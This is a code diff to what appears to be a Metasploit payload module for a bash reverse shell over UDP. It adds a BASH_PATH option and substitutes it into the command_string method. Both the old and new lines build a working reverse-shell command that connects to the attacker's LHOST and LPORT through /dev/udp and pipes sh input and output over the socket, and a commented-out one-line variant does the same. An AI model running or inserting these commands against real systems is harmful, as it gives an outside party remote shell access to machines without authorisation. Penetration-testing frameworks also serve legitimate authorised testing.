@@ -38,6 +38,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('BASH_PATH', [true ,'The path to Bash', 'bash'])
+    ])
   end
 
   #
@@ -53,7 +56,7 @@ module MetasploitModule
   #
   def command_string
     fd = rand(200) + 20
-    return "bash -c '0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};echo>&#{fd};sh <&#{fd} >&#{fd} 2>&#{fd}'";
+    return "#{datastore['BASH_PATH']} -c '0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};echo>&#{fd};sh <&#{fd} >&#{fd} 2>&#{fd}'";
 
     # no semicolons
     #return "sh -i >& /dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1"
